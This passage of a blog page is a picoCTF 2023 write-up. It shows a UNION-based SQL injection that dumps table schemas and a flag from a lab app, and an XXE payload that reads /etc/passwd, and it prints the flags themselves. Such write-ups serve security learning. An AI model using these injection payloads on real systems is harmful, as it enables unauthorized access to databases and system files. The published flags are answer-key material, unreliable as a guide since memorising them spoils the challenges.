+	srcset="/p/picoctf_2023/images/20230328075303_hu14750942444971219211.png 480w, /p/picoctf_2023/images/20230328075303_hu18140223874852906026.png 1024w"
+	loading="lazy"
+	
+		alt="image"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="160"
+		data-flex-basis="386px"
+	
+></p>
+<p>All three columns return our injected string, meaning we can dump information out of any of these three columns. Note you only need one column working to proceed with union injection, and also if you try injecting your string into a column that cannot take string values then the entire SQL query fails.</p>
+<p>Probing the SQL tables:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Kampala&#39; UNION SELECT sql,NULL,NULL from sqlite_master LIMIT 1,5; -- 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/picoctf_2023/images/20230328080123.png"
+	width="583"
+	height="596"
+	srcset="/p/picoctf_2023/images/20230328080123_hu17038243672052735548.png 480w, /p/picoctf_2023/images/20230328080123_hu9641391122867148473.png 1024w"
+	loading="lazy"
+	
+		alt="image"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="97"
+		data-flex-basis="234px"
+	
+></p>
+<p>by pulling sql from sqlite_master, we can see a total of 4 tables:</p>
+<ul>
+<li>hints</li>
+<li>more_table</li>
+<li>offices</li>
+<li>users</li>
+</ul>
+<p>Normally users would be the most interesting for us, but our hint about &ldquo;Maybe all the tables&rdquo; is hinting towards the more_tables table first. We can check each table by using the same type of UNION injection. Note that this table list output also gives us the column names: <code>id</code> and <code>flag</code>. Another reason to try this table first.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Kampala&#39; UNION SELECT id,flag,NULL from more_table where 1=1-- 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/picoctf_2023/images/20230328080756.png"
+	width="577"
+	height="453"
+	srcset="/p/picoctf_2023/images/20230328080756_hu4683722048447642114.png 480w, /p/picoctf_2023/images/20230328080756_hu4973488470222044226.png 1024w"
+	loading="lazy"
+	
+		alt="image"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="127"
+		data-flex-basis="305px"
+	
+></p>
+<p>And with that, we have our flag.
+<code>picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500}</code></p>
+<h3 id="soap">SOAP
+</h3><blockquote>
+<p>The web project was rushed and no security assessment was done. Can you read the /etc/passwd file? <a class="link" href="http://saturn.picoctf.net:55566/"  target="_blank" rel="noopener"
+    >Web Portal</a></p>
+</blockquote>
+<hr>
+<p>Visiting the page we  3 cards, each with an interactable <code>Details</code> button:</p>
+<p><img src="/p/picoctf_2023/images/20230327205408.png"
+	width="1121"
+	height="604"
+	srcset="/p/picoctf_2023/images/20230327205408_hu10953726462331349976.png 480w, /p/picoctf_2023/images/20230327205408_hu9951778753051621380.png 1024w"
+	loading="lazy"
+	
+		alt="image"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="185"
+		data-flex-basis="445px"
+	
+></p>
+<p>When we watch Firefox&rsquo;s Network Monitor and click a detail, we see a post method sent:</p>
+<p><img src="/p/picoctf_2023/images/20230327205640.png"
+	width="1903"
+	height="615"
+	srcset="/p/picoctf_2023/images/20230327205640_hu7845032725672777069.png 480w, /p/picoctf_2023/images/20230327205640_hu808979667671939515.png 1024w"
+	loading="lazy"
+	
+		alt="image"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="309"
+		data-flex-basis="742px"
+	
+></p>
+<p>The request payload is in xml format, potentially leading to XXE (XML external entity) injection. We can try a simple payload described in <a class="link" href="https://portswigger.net/web-security/xxe"  target="_blank" rel="noopener"
+    >portswigger&rsquo;s post</a> on the topic:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">`&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt; &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt; ]&gt; &lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;/stockCheck&gt;`
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>modifying our own payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY abc SYSTEM &#34;file:///etc/passwd&#34;&gt; ]&gt;&lt;data&gt;&lt;ID&gt;&amp;abc;&lt;/ID&gt;&lt;/data&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can resend our request using Firefox&rsquo;s Network Manager again, and replace the body contents with our newly modified payload. In the response tab, we see the contents of <code>/etc/passwd</code> as well as our flag:</p>
+<p><img src="/p/picoctf_2023/images/20230327210246.png"
+	width="1126"
+	height="388"
+	srcset="/p/picoctf_2023/images/20230327210246_hu13880035990363357287.png 480w, /p/picoctf_2023/images/20230327210246_hu10462037924062582120.png 1024w"
+	loading="lazy"
+	
+		alt="image"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="290"
+		data-flex-basis="696px"
+	
+></p>
+<p>picoCTF{XML_3xtern@l_3nt1t1ty_55662c16}</p>
+<p>In an interesting twist of annoyance, the xxe injection fails if you use the entity term &lsquo;xxe&rsquo;, as is done in portswigger&rsquo;s example.  After renaming the entity to &lsquo;abc&rsquo;, the xxe exploit worked effortlessly.</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/pwn/">Pwn</a>
+        
+            <a href="/tags/forensics/">Forensics</a>
+        
+            <a href="/tags/misc/">Misc</a>
+        
+            <a href="/tags/web/">Web</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/hackthebox_cyber_apocalypse_2023/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox_Cyber_Apocalypse_2023</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/huntress-ctf-2024/">
+        
+        
+            <div class="article-image">
+                <img src="/p/huntress-ctf-2024/HuntressCTF_Banner.6181f047aa18073aac2b72b3a0aa3ba2_hu2497031440356620825.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Huntress CTF 2024"
+                        
+                        data-hash="md5-YYHwR6oYBzqsK3KzoKo7og==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Huntress CTF 2024</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-cyber-apocalypse-2024/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-cyber-apocalypse-2024/ca-2024-ctf-background.d1ff26ab7326bd1a79b6d1e0a52f6aa6_hu13886050347455417942.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Cyber Apocalypse: 2024"
+                        
+                        data-hash="md5-0f8mq3MmvRp5ttHgpS9qpg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Cyber Apocalypse: 2024</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/hack-the-boo-2023/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Hack The Boo 2023</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/nahamconctf_2023/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">NahamConCTF_2023</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2024 Spencer&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.799eb5847effe83ae252baf7b2236f0c3752b0188dd0985faa7efc75ea805b29.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
